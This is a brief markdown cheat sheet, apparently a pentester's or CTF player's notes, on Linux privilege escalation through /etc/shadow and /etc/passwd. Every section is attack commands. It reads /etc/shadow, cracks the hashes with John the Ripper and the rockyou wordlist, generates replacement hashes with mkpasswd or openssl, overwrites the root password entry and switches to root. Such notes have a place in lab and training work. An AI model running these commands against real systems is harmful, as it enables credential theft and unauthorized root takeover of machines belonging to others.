# Shadow
## crack password
ls -l /etc/shadow

cat /etc/shadow

Unzip and then use johnTheRipper
save the hash to hash.txt
unzip /usr/share/wordlists/rockyou.txt.gz 
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

## replace password shadow

ls -l /etc/shadow

generate new password, rember to switch algoritm
mkpasswd -m sha-512 newpasswordhere
replace password in /etc/shadow

## replace password passwd
 cat /etc/passwd
 openssl passwd newpasswordhere
 replace root password
 su root
